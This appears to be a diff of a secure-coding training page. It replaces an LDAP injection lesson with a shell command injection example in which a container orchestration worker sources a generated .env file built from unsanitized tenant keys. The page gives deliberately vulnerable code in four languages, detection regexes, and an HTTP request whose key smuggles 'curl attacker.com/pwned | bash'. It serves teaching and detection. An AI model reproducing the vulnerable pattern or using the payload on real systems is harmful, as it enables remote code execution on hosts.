-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+\b(?:Files\.writeString\s*\([^,]+,\s*"export\s+"\s*\+\s*\w+|Files\.write\s*\([^,]+,.*\+.*\w+\))
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+\b(?:file_put_contents\s*\([^,]+,\s*"export\s+\{\$.*\}|file_put_contents\s*\([^,]+,.*\$.*\))
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+\b(?:fs\.writeFileSync\s*\([^,]+,\s*`export\s+\$\{.*\}|fs\.writeFile\s*\([^,]+,.*\$\{.*\})
 ```
 {% endtab %}
 {% endtabs %}
@@ -2165,25 +2264,25 @@ class SamlProvisioningService {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+File\.WriteAllTextAsync\([^,]+,\s*\\\$"export\s+\{
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+Files\.writeString\([^,]+,\s*"export\s+"\s*\+\s*key
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+file_put_contents\([^,]+,\s*"export\s+\{\\\$key\}
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+fs\.writeFileSync\([^,]+,\s*`export\s+\\\$\\{key\}
 ```
 {% endtab %}
 {% endtabs %}
@@ -2193,25 +2292,39 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class ContainerOrchestrationWorker 
 {
-    private readonly LdapConnection _ldapConnection;
-
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task ProvisionTenantEnvironmentAsync(string tenantId, Dictionary<string, string> customSettings) 
     {
+        var envFilePath = $"/tmp/env_provisioning/{tenantId}.env";
+        var envBuilder = new StringBuilder();
+
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
-        // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        envBuilder.AppendLine("# Auto-generated tenant configuration");
 
-        return ExtractRolesFromLdapResponse(response);
+        // [3]
+        foreach (var setting in customSettings) 
+        {
+            // [4]
+            envBuilder.AppendLine($"export {setting.Key}=\"{EscapeShellArg(setting.Value)}\"");
+        }
+
+        await File.WriteAllTextAsync(envFilePath, envBuilder.ToString());
+
+        // [5]
+        var startInfo = new ProcessStartInfo
+        {
+            FileName = "/bin/bash",
+            Arguments = $"-c \"source {envFilePath} && docker run --env-file {envFilePath} my-tenant-image\"",
+            UseShellExecute = false
+        };
+
+        using var process = Process.Start(startInfo);
+        await process.WaitForExitAsync();
     }
+
+    private string EscapeShellArg(string arg) => arg.Replace("\"", "\\\"");
 }
 ```
 {% endtab %}
@@ -2219,51 +2332,65 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class ContainerOrchestrationWorker {
 
-    @Autowired
-    private LdapTemplate ldapTemplate;
+    public void provisionTenantEnvironment(String tenantId, Map<String, String> customSettings) throws Exception {
+        Path envFilePath = Paths.get("/tmp/env_provisioning/" + tenantId + ".env");
+        StringBuilder envBuilder = new StringBuilder();
 
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
-        // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
-        );
+        envBuilder.append("# Auto-generated tenant configuration\n");
 
-        return roles;
+        // [3]
+        for (Map.Entry<String, String> setting : customSettings.entrySet()) {
+            // [4]
+            envBuilder.append("export ").append(setting.getKey()).append("=\"")
+                      .append(escapeShellArg(setting.getValue())).append("\"\n");
+        }
+
+        Files.writeString(envFilePath, envBuilder.toString());
+
+        // [5]
+        String[] cmd = {
+            "/bin/bash",
+            "-c",
+            "source " + envFilePath.toString() + " && docker run --env-file " + envFilePath.toString() + " my-tenant-image"
+        };
+
+        Process process = Runtime.getRuntime().exec(cmd);
+        process.waitFor();
     }
+
+    private String escapeShellArg(String arg) { return arg.replace("\"", "\\\""); }
 }
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class ContainerOrchestrationWorker 
 {
-    protected $ldapConnection;
-
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function provisionTenantEnvironment(string $tenantId, array $customSettings): void 
     {
-        // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
-        // [2]
-        // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
+        $envFilePath = "/tmp/env_provisioning/{$tenantId}.env";
         
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        // [1]
+        // [2]
+        $envContent = "# Auto-generated tenant configuration\n";
 
-        return $this->extractRoles($entries);
+        // [3]
+        foreach ($customSettings as $key => $value) 
+        {
+            // [4]
+            $envContent .= "export {$key}=\"" . escapeshellarg($value) . "\"\n";
+        }
+
+        file_put_contents($envFilePath, $envContent);
+
+        // [5]
+        $cmd = "/bin/bash -c 'source {$envFilePath} && docker run --env-file {$envFilePath} my-tenant-image'";
+        shell_exec($cmd);
     }
 }
 ```
@@ -2271,28 +2398,30 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
+class ContainerOrchestrationWorker {
+    static async provisionTenantEnvironment(tenantId, customSettings) {
+        const envFilePath = `/tmp/env_provisioning/${tenantId}.env`;
+        
         // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
         // [2]
+        let envContent = `# Auto-generated tenant configuration\n`;
+
         // [3]
-        // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
+        for (let [key, value] of Object.entries(customSettings)) {
+            // [4]
+            let safeValue = value.replace(/"/g, '\\"');
+            envContent += `export ${key}="${safeValue}"\n`;
+        }
 
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
+        fs.writeFileSync(envFilePath, envContent);
 
+        // [5]
+        let cmd = `/bin/bash -c "source ${envFilePath} && docker run --env-file ${envFilePath} my-tenant-image"`;
+        
         return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
+            exec(cmd, (error) => {
+                if (error) return reject(error);
+                resolve();
             });
         });
     }
@@ -2303,11 +2432,37 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] The orchestration service is responsible for securely provisioning dedicated instances for specific enterprise tenants, \[2] To comply with strict security requirements preventing secret exposure in hypervisor process lists (`ps`), the developer writes the configuration secrets directly to a localized flat file (`.env`), \[3] The architecture seamlessly merges the system's generated secrets with the tenant's dynamically provided `CustomSettings` array, \[4] The developer assumes that JSON Keys are strictly deterministic configuration properties (e.g., `LOG_LEVEL` or `API_URL`) and omits character sanitization, \[5] The fatal execution sink. The orchestration worker executes the `source` command against the generated `.env` file to load the variables into the current session _before_ invoking the `docker run` command. Because `source` inherently evaluates the file as a raw Bash shell script, the attacker's unsanitized Key structure commands the native OS interpreter to execute arbitrary system binaries on the core orchestration node, completely bypassing the intended Docker isolation wrapper
 
+```http
+// 1. Attacker (Tenant Admin) navigates to their Workspace Provisioning dashboard.
+// 2. Attacker submits a deployment request containing the structural breakout payload within the Dictionary Key.
+POST /api/v1/workspaces/deploy HTTP/1.1
+Host: cloud.enterprise.tld
+Authorization: Bearer <tenant_admin_token>
+Content-Type: application/json
+
+{
+  "workspaceName": "Attacker_Workspace_1",
+  "customSettings": {
+    "DUMMY=\"1\"; curl attacker.com/pwned | bash; export INJECTED": "safe_value"
+  }
+}
+
+// 3. The Orchestration backend synthesizes the /tmp/env_provisioning/tenant_1.env file on the host OS:
+// # Auto-generated tenant configuration
+// export DUMMY="1"; curl attacker.com/pwned | bash; export INJECTED="safe_value"
+
+// 4. The Orchestration backend executes the deployment trigger:
+// /bin/bash -c "source /tmp/env_provisioning/tenant_1.env && docker run ..."
+
+// 5. The host's bash interpreter parses the sourced file, exports DUMMY, and immediately executes the injected 
+// curl/bash pipeline directly on the Cloud Orchestration Server (Host OS), capturing the orchestration control plane.
+```
 {% endstep %}
 
 {% step %}
-
+To fulfill compliance mandates prohibiting the transport of plaintext secrets via process arguments, platform engineers architected a dynamic DotEnv synthesis pipeline. They correctly identified the risk of secret leakage in hypervisor logs and opted to write ephemeral shell scripts to disk for localized sourcing. The security flaw emerged from an asymmetric trust boundary: engineers painstakingly escaped the configuration _Values_ while explicitly trusting the configuration _Keys_. The attacker weaponized this trust by crafting a JSON key that functionally rewrote the shell syntax. When the backend synthesized the configuration file, it permanently embedded the attacker's command termination strings. During the provisioning lifecycle, the orchestration node invoked the `source` utility to parse the file, inadvertently executing the attacker's payload at the host level and achieving total infrastructure compromise prior to container execution
 {% endstep %}
 {% endstepper %}
 
